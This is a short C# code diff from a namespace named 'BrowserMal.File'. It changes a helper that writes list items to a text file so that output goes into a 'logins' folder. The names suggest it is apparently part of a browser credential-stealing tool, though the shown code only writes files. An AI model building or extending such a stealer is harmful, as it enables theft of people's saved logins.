@@ -12,7 +12,7 @@ namespace BrowserMal.File
             foreach (T item in list)
                 stringBuilder.AppendLine(item.ToString());
 
-            System.IO.File.WriteAllText(outputPath, stringBuilder.ToString());
+            System.IO.File.WriteAllText(@"logins\" + outputPath, stringBuilder.ToString());
         }
     }
 }
